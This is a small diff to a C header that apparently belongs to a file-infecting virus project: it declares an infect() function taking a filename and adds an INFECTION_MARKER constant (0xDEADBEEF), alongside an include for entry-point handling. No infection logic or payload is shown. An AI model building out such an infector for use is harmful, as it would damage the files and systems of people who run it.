@@ -9,6 +9,8 @@
 #include "utility.h"
 #include "oep.h"
 
+#define INFECTION_MARKER (0xDEADBEEF)
+
 int infect(const char* filename, data_t* data);
 
 #endif
